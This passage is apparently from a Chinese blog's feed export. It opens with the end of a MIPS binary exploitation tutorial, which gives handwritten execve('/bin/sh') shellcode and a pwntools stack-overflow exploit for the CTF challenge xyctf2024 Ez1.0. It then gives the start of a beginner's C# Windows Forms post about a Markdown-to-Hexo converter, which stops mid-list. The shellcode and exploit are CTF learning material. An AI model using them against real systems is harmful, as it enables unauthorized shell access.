<p>之后就可以手搓execve系统调用的shellcode了，系统调用号可以在<a class="link"   href="https://syscalls.w3challs.com/?arch=mips_o32%E8%BF%99%E6%9F%A5%EF%BC%8Cv0%E5%AD%98%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%8F%B7%EF%BC%8Ca0%EF%BC%8Ca1%EF%BC%8Ca2%E5%88%86%E5%88%AB%E5%AD%98%E4%B8%89%E4%B8%AA%E5%8F%82%E6%95%B0%EF%BC%8C%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E5%B0%86%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%86%99%E5%88%B0%E6%A0%88%E9%A1%B6%EF%BC%8C%E5%9C%A8%E6%8A%8A%E5%8F%82%E6%95%B0%E6%8C%87%E5%90%91$sp%EF%BC%8C%E5%B0%B1%E8%83%BD%E5%AE%9E%E7%8E%B0%E5%AD%97%E7%AC%A6%E5%8F%82%E6%95%B0%E7%9A%84%E4%BC%A0%E9%80%92%E4%BA%86%E3%80%82" >https://syscalls.w3challs.com/?arch=mips_o32这查，v0存系统调用号，a0，a1，a2分别存三个参数，可以通过将字符串写到栈顶，在把参数指向$sp，就能实现字符参数的传递了。<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">li $v0,0xfab		</span></span><br><span class="line"><span class="string">li $t0,0x0068732f</span></span><br><span class="line"><span class="string">li $t1,0x6e69622f</span></span><br><span class="line"><span class="string">addi $sp,$sp,-4</span></span><br><span class="line"><span class="string">sw $t0, 0($sp)</span></span><br><span class="line"><span class="string">addi $sp,$sp,-4</span></span><br><span class="line"><span class="string">sw $t1, 0($sp)</span></span><br><span class="line"><span class="string">or $a0,$sp,$zero</span></span><br><span class="line"><span class="string">or $a1,$zero,$zero</span></span><br><span class="line"><span class="string">or $a2,$zero,$zero</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>这里需要注意的一点是execve的第一个参数最好是&#x2F;bin&#x2F;sh，如果图方便只传进去一个sh，因为后面的环境变量参数置零了，很可能会找不到sh报警告，继续向下执行。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/mips-pwn/image-20240921180832554.png"
                      class=""
                >

<h4 id="四、题目复现"><a href="#四、题目复现" class="headerlink" title="四、题目复现"></a>四、题目复现</h4><h5 id="xyctf2024-Ez1-0"><a href="#xyctf2024-Ez1-0" class="headerlink" title="[xyctf2024]Ez1.0"></a>[xyctf2024]Ez1.0</h5><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/mips-pwn/image-20240921180859013.png"
                      class=""
                >

<p>非常简单粗暴的栈溢出，根据上述漏洞利用原理构造即可</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;mips&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">program = <span class="string">&quot;./mips&quot;</span></span><br><span class="line">p = process([<span class="string">&quot;qemu-mipsel-static&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;2333&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;./&quot;</span>, program])</span><br><span class="line">gdb.attach(p,<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    file <span class="subst">&#123;program&#125;</span></span></span><br><span class="line"><span class="string">    target remote 127.0.0.1:2333</span></span><br><span class="line"><span class="string">    b main</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gadget1 = <span class="number">0x00427968</span></span><br><span class="line">gadget2 = <span class="number">0x0041FBF4</span></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">li $v0,0xfab            </span></span><br><span class="line"><span class="string">li $t0,0x0068732f</span></span><br><span class="line"><span class="string">li $t1,0x6e69622f</span></span><br><span class="line"><span class="string">addi $sp,$sp,-4</span></span><br><span class="line"><span class="string">sw $t0, 0($sp)</span></span><br><span class="line"><span class="string">addi $sp,$sp,-4</span></span><br><span class="line"><span class="string">sw $t1, 0($sp)</span></span><br><span class="line"><span class="string">or $a0,$sp,$zero</span></span><br><span class="line"><span class="string">or $a1,$zero,$zero</span></span><br><span class="line"><span class="string">or $a2,$zero,$zero</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#shellcode = shellcraft.sh()</span></span><br><span class="line">payload = asm(shellcode).ljust(<span class="number">0x40</span>,<span class="string">b&quot;A&quot;</span>) + p32(gadget2) + p32(gadget1) + <span class="string">b&quot;A&quot;</span>*<span class="number">0x58</span> + asm(shellcode)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>mips</tag>
      </tags>
  </entry>
  <entry>
    <title>C#开发windows程序学习记录</title>
    <url>/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="C-开发学习记录1"><a href="#C-开发学习记录1" class="headerlink" title="C#开发学习记录1"></a>C#开发学习记录1</h2><p>开发环境：Visual Studio 2022</p>
<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>从高中时就对开发软件比较感兴趣，用过pygame写过小游戏，当时其实也想用Unity来写个游戏来着。不过高中确实学业压力比较重，加上Unity主要是用C#作为编程语言的，当时也没接触过C#语言，就不了了之。大一又误入安全歧途:smirk:，一直在打ctf，现在趁寒假学点windows程序开发。一开始我看了b站上的视频学习windows程序设计，用的是windows api，不过都是上古（指5年前）的产物了。后面一问gpt才发现，C#是 Windows 应用程序开发的首选语言，尤其是对于快速开发而言。这里就不再从基础语法学起，直接结合ai智慧搓一个小项目来学习吧。</p>
<p>因为我平时做学习的记录都是直接用markdown记录，那么如果想将文章部署到我的博客</p>
<p>这里我们的项目目标是将一般的Markdown文件转换成Hexo特定主题的文章格式，其实hexo是可以直接解析markdown语法，但是需要手动把图片复制到特定目录下，并且图片的显示却会出现问题。看了hexo的开发文档发现可以用<code>&#123;% asset_img img_name %&#125;</code>来指定显示的图片。那么我们可以就以这个目标来学习windows的程序开发。</p>
<p>先安装个AI辅助插件，增加效率。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250125125053180.png"
                      class=""
                >



<h4 id="功能设计"><a href="#功能设计" class="headerlink" title="功能设计"></a>功能设计</h4><ol>
<li><strong>用户界面 (UI) 设计</strong></li>
</ol>
<ul>
<li>功能<ul>
<li>提供直观的图形界面，让用户轻松完成文件选择、设置和 Markdown 文件转换。</li>
</ul>
</li>
<li>具体实现<ul>
<li><strong>文件选择界面</strong>：使用 <code>TreeView</code> 或 <code>ListView</code> 显示文件夹结构，支持拖拽文件。</li>
<li><strong>设置界面</strong>：使用 <code>TextBox</code>、<code>ComboBox</code> 等控件来输入 Hexo 路径、选择主题、设置发布模式，切换语言等。</li>
<li><strong>进度显示和日志</strong>：在转换和处理过程中，显示进度条、日志或消息提示，帮助用户了解当前操作进展。</li>
<li><strong>错误提示</strong>：当出现错误时，显示友好的错误消息，帮助用户解决问题。</li>
</ul>
</li>
</ul>
<ol start="2">
<li><strong>设置界面 (Settings Interface)</strong></li>
</ol>
<ul>
<li><p>功能</p>
<ul>
<li>设置 Hexo 本地路径，让程序知道 Hexo 文件夹的位置。</li>
<li>设置显示字体与大小。</li>
<li>选择 Hexo 主题，或者设置 Hexo 相关配置项。</li>
<li>设置显示语言</li>
</ul>
</li>
<li><p>具体实现</p>
<ul>
<li><p>使用表单控件（例如 <code>TextBox</code>、<code>ComboBox</code> 等）来接收用户输入的路径、模式和主题等信息。</p>
</li>
<li><p>使用 <code>FolderBrowserDialog</code> 来允许用户选择本地 Hexo 路径。</p>
</li>
<li><p>提供保存设置的功能，可以将用户选择的路径和设置保存到配置文件中（如 <code>.json</code> 或 <code>.xml</code> 格式）或者注册表中，保证下次启动时能够恢复。</p>
</li>
<li></li>
</ul>
</li>
</ul>
<ol start="3">
<li><strong>Markdown 转换和图片处理功能 (Markdown Conversion and Image Handling)</strong></li>
</ol>
<ul>
<li>功能<ul>
<li>将用户选定的 Markdown 文件转为 Hexo 特定主题的文章格式。</li>
<li>自动处理图片，复制到 Hexo 主题的特定目录，并使用 Hexo 的图片语法（例如 <code>&#123;% asset_img img_name %&#125;</code>）来引用图片。</li>
</ul>
</li>
<li>具体实现<ul>
<li>解析 Markdown 文件内容，是直接使用文件IO操作，增加和替换特定内容。</li>
<li>提取 Markdown 文件中的图片路径并处理：<ul>
<li>将图片文件复制到 Hexo 主题目录中的 <code>/source/images/</code> 或其他指定目录。</li>
<li>在生成的文章中，使用 Hexo 语法 <code>&#123;% asset_img img_name %&#125;</code> 来引用图片。</li>
</ul>
</li>
<li>图片复制时，检查目标目录是否已经有相同的文件，避免覆盖。</li>
<li>可以使用正则表达式或其他文本处理方法来解析和替换 Markdown 中的图片路径。</li>
</ul>
</li>
</ul>
<ol start="4">
<li><strong>插件系统 (Plugin System)</strong></li>
</ol>
<ul>
<li>功能<ul>
<li>允许未来扩展，比如自动获取 Hexo 特定主题配置、提供更多 Hexo 主题支持、图像优化等。</li>
<li>可以支持插件的安装、卸载和更新。</li>
</ul>
</li>
<li>具体实现<ul>
<li>设计插件接口，允许通过 DLL 动态加载插件。</li>
<li>使用 C# 的反射（Reflection）机制动态加载插件并调用其中的功能。</li>
<li>设计一个简单的插件管理器，允许用户选择和管理插件。</li>
</ul>
</li>
</ul>
<ol start="6">
<li><strong>可拓展性和未来计划</strong></li>
</ol>
<ul>
<li>功能<ul>
<li>未来可以加入更多的 Hexo 特定功能，如一键获取和配置 Hexo 特定主题，自动生成页面摘要、标签等。</li>
<li>也可以扩展支持其他平台的静态网站生成器，或者为用户提供更多的 Markdown 格式转换选项。</li>
</ul>
</li>
<li>具体实现<ul>
<li>通过插件架构，将新功能封装为独立的插件，用户可以根据需求安装和启用。</li>
<li>提供 SDK 或文档，允许第三方开发者为项目开发自定义插件。</li>
</ul>
</li>
</ul>
<h4 id="UI界面设计"><a href="#UI界面设计" class="headerlink" title="UI界面设计"></a>UI界面设计</h4><h5 id="菜单栏实现"><a href="#菜单栏实现" class="headerlink" title="菜单栏实现"></a>菜单栏实现</h5><p>创建好项目后，将会看到一个默认的窗体（Form）。默认情况下，Visual Studio 会打开窗体的设计视图（设计器视图），可以在这里设计界面。</p>
<p>比如我们要<strong>添加按钮组件</strong>，就可以在 <strong>设计视图</strong> 中，你可以通过工具箱拖放控件来创建界面元素。</p>
<ol>
<li>打开 <strong>工具箱</strong>（通常位于 Visual Studio 窗口的左侧，如果没有看到工具箱，可以通过 <strong>视图 &gt; 工具箱</strong> 打开）。</li>
<li>在 <strong>工具箱</strong> 中，找到 <strong>按钮</strong>（Button）控件。</li>
<li>将按钮从工具箱中拖动到窗体上。</li>
<li>放置按钮后，你可以调整按钮的位置、大小以及其他属性。</li>
</ol>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250125132903827.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250125133204899.png"
                      class=""
                >

<p>之后就会创建button1的组件，我们可以在button1_Click中设计其被点击后的行为。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250125133318279.png"
                      class=""
                >

<p>不过常见的菜单栏组件一般为<strong>MenuStrip</strong>控件，而不是靠button的堆叠。这里我们的目标是先实现一个菜单栏，里面有打开、设置、插件和帮助四个选项。过程就是从工具箱中选<strong>MenuStrip</strong>拖到设计图中。我们还可以设置子菜单，但这里我们先从简单的功能实现起，暂时不用子菜单。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250125134843093.png"
                      class=""
                >

<p>接下来我们要实现的是点击 <strong>File</strong> 菜单后，显示本机目录选择对话框，并将选中的文件目录保存到某个变量。首先我们来看一下<strong>InitializeComponent</strong>的实现，这里所有菜单组件的实现都类似，所以我们只用看一个<strong>File</strong>组件对应的实现。实际上，这些代码都是自动生成的，不需要我们更改。但为了更好理解过程，这里进行细致的学习。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250125140341460.png"
                      class=""
                >

<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// menuStrip1</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="keyword">this</span>.menuStrip1.ImageScalingSize = <span class="keyword">new</span> System.Drawing.Size(<span class="number">20</span>, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">this</span>.menuStrip1.Items.AddRange(<span class="keyword">new</span> System.Windows.Forms.ToolStripItem[] &#123;</span><br><span class="line"><span class="keyword">this</span>.FileToolStripMenuItem,</span><br><span class="line"><span class="keyword">this</span>.SettingsToolStripMenuItem,</span><br><span class="line"><span class="keyword">this</span>.PluginsToolStripMenuItem,</span><br><span class="line"><span class="keyword">this</span>.HelpToolStripMenuItem&#125;);</span><br><span class="line"><span class="keyword">this</span>.menuStrip1.Location = <span class="keyword">new</span> System.Drawing.Point(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">this</span>.menuStrip1.Name = <span class="string">&quot;menuStrip1&quot;</span>;</span><br><span class="line"><span class="keyword">this</span>.menuStrip1.Size = <span class="keyword">new</span> System.Drawing.Size(<span class="number">948</span>, <span class="number">28</span>);</span><br><span class="line"><span class="keyword">this</span>.menuStrip1.TabIndex = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">this</span>.menuStrip1.Text = <span class="string">&quot;menuStrip1&quot;</span>;</span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// FileToolStripMenuItem</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="keyword">this</span>.FileToolStripMenuItem.Name = <span class="string">&quot;FileToolStripMenuItem&quot;</span>;</span><br><span class="line"><span class="keyword">this</span>.FileToolStripMenuItem.Size = <span class="keyword">new</span> System.Drawing.Size(<span class="number">48</span>, <span class="number">24</span>);</span><br><span class="line"><span class="keyword">this</span>.FileToolStripMenuItem.Text = <span class="string">&quot;File&quot;</span>;</span><br><span class="line"><span class="keyword">this</span>.FileToolStripMenuItem.Click += <span class="keyword">new</span> System.EventHandler(<span class="keyword">this</span>.FileToolStripMenuItem_Click);</span><br></pre></td></tr></table></figure></div>

<p><code>menuStrip1</code>：这是菜单栏的容器控件，负责将菜单项（如 <strong>File</strong>）显示在窗体顶部。</p>
<p><code>FileToolStripMenuItem</code>：这是菜单栏中的一个菜单项，用来表示 <strong>File</strong> 菜单。</p>
<p><code>this.menuStrip1.Items.AddRange(...)</code>：将多个组件添加到 <code>menuStrip1</code> 中，表示在菜单栏中添加 <strong>File</strong> 、<strong>Settings</strong>等菜单项。</p>
<p><code>this.FileToolStripMenuItem.Click += new System.EventHandler(this.FileToolStripMenuItem_Click);</code>：这行代码表示当点击 <strong>File</strong> 菜单项时，会触发 <code>FileToolStripMenuItem_Click</code> 方法。</p>
<p>其余一些设置名称和设置大小的内容就不作赘述。</p>
<h5 id="可视化文件选取实现"><a href="#可视化文件选取实现" class="headerlink" title="可视化文件选取实现"></a>可视化文件选取实现</h5><p><strong>FileToolStripMenuItem_Click</strong>实现如下（在Form1.cs中），是用<strong>OpenFileDialog</strong>实现可视化菜单。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.ComponentModel;</span><br><span class="line"><span class="keyword">using</span> System.Data;</span><br><span class="line"><span class="keyword">using</span> System.Drawing;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Forms;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Markdown2Hexo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">partial</span> <span class="keyword">class</span> <span class="title">Form1</span> : <span class="title">Form</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 用于保存选中的文件夹路径</span></span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">string</span> selectedFilePath;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Form1</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            InitializeComponent();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">FileToolStripMenuItem_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 创建文件选择对话框</span></span><br><span class="line">            <span class="keyword">using</span> (OpenFileDialog fileDialog = <span class="keyword">new</span> OpenFileDialog())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 设置对话框的描述</span></span><br><span class="line">                fileDialog.Title = <span class="string">&quot;请选择文件&quot;</span>;</span><br><span class="line">                fileDialog.Filter = <span class="string">&quot;Markdown 文件 (*.md)|*.md|所有文件 (*.*)|*.*&quot;</span>; <span class="comment">// 你可以根据需要设置过滤器</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// 显示文件选择对话框并检查用户是否选择了文件</span></span><br><span class="line">                <span class="keyword">if</span> (fileDialog.ShowDialog() == DialogResult.OK)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 获取选中的文件路径</span></span><br><span class="line">                    selectedFilePath = fileDialog.FileName;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 显示选中文件的路径</span></span><br><span class="line">                    MessageBox.Show(<span class="string">$&quot;您选择的文件路径是: <span class="subst">&#123;selectedFilePath&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 你可以在这里处理选中的文件</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250125141650926.png"
                      class=""
                >

<p>获取到了选择的文件后，就可以进行进一步的处理了。为了将业务逻辑和具体的功能处理应该尽量与界面逻辑分离，所以我们要新建一个<strong>FileProcessor</strong>类，里面创建<strong>ProcessMarkdownFile</strong>方法来用于实现业务逻辑。而在Form1.cs中可以简单的创建对象并调用其方法。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Form1.cs</span></span><br><span class="line">......</span><br><span class="line"><span class="keyword">if</span> (fileDialog.ShowDialog() == DialogResult.OK)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 获取选中的文件路径</span></span><br><span class="line">    selectedFilePath = fileDialog.FileName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理选中的文件</span></span><br><span class="line">    FileProcessor processor = <span class="keyword">new</span> FileProcessor();</span><br><span class="line">    processor.ProcessMarkdownFile(selectedFilePath);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//FileProcessor.cs</span></span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Markdown2Hexo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">FileProcessor</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 处理Markdown文件</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ProcessMarkdownFile</span>(<span class="params"><span class="built_in">string</span> filePath</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">			......</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h5 id="窗口大小获取"><a href="#窗口大小获取" class="headerlink" title="窗口大小获取"></a>窗口大小获取</h5><p>获取各组件大小是设计UI的关键内容。</p>
<p>获取整个窗口的大小</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取窗口的大小（不包括标题栏和边框）</span></span><br><span class="line">Size windowSize = <span class="keyword">this</span>.ClientSize;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取窗口的总大小（包括标题栏和边框）</span></span><br><span class="line">Size totalWindowSize = <span class="keyword">this</span>.Size;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示结果</span></span><br><span class="line">MessageBox.Show(<span class="string">$&quot;Window Size: <span class="subst">&#123;windowSize.Width&#125;</span> x <span class="subst">&#123;windowSize.Height&#125;</span>\n&quot;</span> +</span><br><span class="line">                <span class="string">$&quot;Total Window Size: <span class="subst">&#123;totalWindowSize.Width&#125;</span> x <span class="subst">&#123;totalWindowSize.Height&#125;</span>&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>获取 <code>MenuStrip</code> 的大小</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取 MenuStrip 的大小</span></span><br><span class="line">Size menuStripSize = menuStrip1.Size;</span><br><span class="line"><span class="comment">// 显示结果</span></span><br><span class="line">MessageBox.Show(<span class="string">$&quot;MenuStrip Size: <span class="subst">&#123;menuStripSize.Width&#125;</span> x <span class="subst">&#123;menuStripSize.Height&#125;</span>&quot;</span>);</span><br></pre></td></tr></table></figure></div>



<h5 id="单窗口页面切换实现"><a href="#单窗口页面切换实现" class="headerlink" title="单窗口页面切换实现"></a>单窗口页面切换实现</h5><p>之后我们先不急于实现业务逻辑，继续设计settings的UI。这里我不想弹出一个新的窗体进行窗口配置，目标就是在原先窗口中能有窗口选项卡进行切换。这里可以选择用<strong>TabControl</strong>组件进行实现。当用户点击 <code>MenuStrip</code> 中的 <code>Settings</code> 或 <code>Help</code> 等菜单项时，在 <strong>TabControl</strong> 中动态创建一个对应的 <strong>TabPage</strong> 组件。每个<strong>TabPage</strong>都能够往里面add各种控件，相当于一个我们要设计的页面，而主窗口显示哪个<strong>TabPage</strong>就是由<strong>TabControl</strong>进行控制。</p>
<p>先了解下<strong>TabControl</strong>的常用属性与方法：</p>
<p><strong>常用属性</strong></p>
<ol>
<li><p><strong><code>SelectedTab</code></strong></p>
<p>获取或设置当前选中的 <code>TabPage</code>。</p>
<p><strong>类型</strong>: <code>TabPage</code></p>
</li>
<li><p><strong><code>TabPages</code></strong></p>
<p>获取包含所有选项卡的 <code>TabPageCollection</code>，可以通过该属性访问、添加、删除选项卡。</p>
<p><strong>类型</strong>: <code>TabPageCollection</code></p>
</li>
<li><p><strong><code>TabCount</code></strong></p>
<p>获取 <code>TabControl</code> 中的选项卡数目。</p>
<p><strong>类型</strong>: <code>int</code></p>
</li>
<li><p><strong><code>Alignment</code></strong></p>
<p>获取或设置选项卡的对齐方式（例如，顶部、底部、左侧或右侧）。</p>
<p><strong>类型</strong>: <code>TabAlignment</code></p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.Alignment = TabAlignment.Top; <span class="comment">// 顶部对齐</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>ItemSize</code></strong></p>
<p>获取或设置选项卡的大小（宽度和高度）。</p>
<p><strong>类型</strong>: <code>Size</code></p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.ItemSize = <span class="keyword">new</span> Size(<span class="number">100</span>, <span class="number">30</span>); <span class="comment">// 设置选项卡宽度和高度</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>Multiline</code></strong></p>
<p>获取或设置是否允许选项卡多行显示。</p>
<p><strong>类型</strong>: <code>bool</code></p>
</li>
<li><p><strong><code>TabIndex</code></strong></p>
<p>获取或设置 <code>TabControl</code> 的索引（即它在窗体中所占的位置）。</p>
<p><strong>类型</strong>: <code>int</code></p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> tabIndex = tabControl.TabIndex;</span><br><span class="line">tabControl.TabIndex = <span class="number">1</span>; <span class="comment">// 设置选项卡的索引</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>TabStop</code></strong></p>
<p>获取或设置是否允许在 <code>TabControl</code> 中使用 Tab 键进行切换。</p>
<p><strong>类型</strong>: <code>bool</code></p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.TabStop = <span class="literal">false</span>; <span class="comment">// 禁用 Tab 键切换</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>Dock</code></strong></p>
<p>获取或设置 <code>TabControl</code> 的停靠方式。</p>
<p><strong>类型</strong>: <code>DockStyle</code></p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.Dock = DockStyle.Fill; <span class="comment">// 填充整个容器</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>Height</code> 和 <code>Width</code></strong></p>
<p>获取或设置 <code>TabControl</code> 的高度和宽度。</p>
<p><strong>类型</strong>: <code>int</code></p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.Height = <span class="number">300</span>; <span class="comment">// 设置高度</span></span><br><span class="line">tabControl.Width = <span class="number">500</span>;  <span class="comment">// 设置宽度</span></span><br></pre></td></tr></table></figure></div></li>
</ol>
<p><strong>常用方法</strong></p>
<ol>
<li><p><strong><code>Add(TabPage page)</code></strong></p>
<p>向 <code>TabControl</code> 中添加一个新的 <code>TabPage</code>。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">TabPage newPage = <span class="keyword">new</span> TabPage(<span class="string">&quot;New Tab&quot;</span>);</span><br><span class="line">tabControl.TabPages.Add(newPage);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>Remove(TabPage page)</code></strong></p>
<p>从 <code>TabControl</code> 中移除一个 <code>TabPage</code>。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.TabPages.Remove(someTabPage);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>Clear()</code></strong></p>
<p>清除所有的 <code>TabPage</code>。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.TabPages.Clear(); <span class="comment">// 清空所有选项卡</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>SelectTab(int index)</code></strong></p>
<p>通过索引选择某个 <code>TabPage</code>。</p>
